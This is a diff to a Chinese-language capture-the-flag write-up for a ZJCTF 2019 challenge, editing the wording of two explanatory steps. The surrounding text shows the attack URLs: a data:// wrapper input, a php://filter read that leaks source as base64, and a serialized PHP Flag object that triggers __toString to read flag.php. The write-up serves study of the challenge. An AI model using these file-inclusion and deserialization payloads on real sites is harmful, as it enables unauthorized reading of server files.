@@ -9,7 +9,7 @@ Date: 2021-01-19
 ## 思路
 1. 分析源码，通过data伪协议构造text，php伪协议获取useless.php  
 ```http://f24186f1-2297-429c-a5c2-67224f46c43a.node3.buuoj.cn?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&password=1&file=php://filter/read=convert.base64-encode/resource=useless.php```
-2. useless.php文件内容如下，构造序列化的数据，在反序列化时会自动执行__tostring函数，实现获得文件内容  
+2. useless.php文件内容如下，构造序列化的数据，在反序列化之后，会自动执行__tostring函数，实现获得文件内容  
 ```php
 <?php
 
@@ -27,7 +27,7 @@ class Flag{  //flag.php
 //echo serialize($f);
 ?>
 ```
-3. 完整载荷如下，这里file利用伪协议的话，会让反序列化的数据无法展示，故这里为useless.php   
+3. 完整载荷如下，这里file利用伪协议的话，会让`echo $password`无法展示，故这里为useless.php   
 ```http://f24186f1-2297-429c-a5c2-67224f46c43a.node3.buuoj.cn?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}&file=useless.php```
 4. 在注释中含有flag  
    ![](images/zjctf-2019-nz.png)
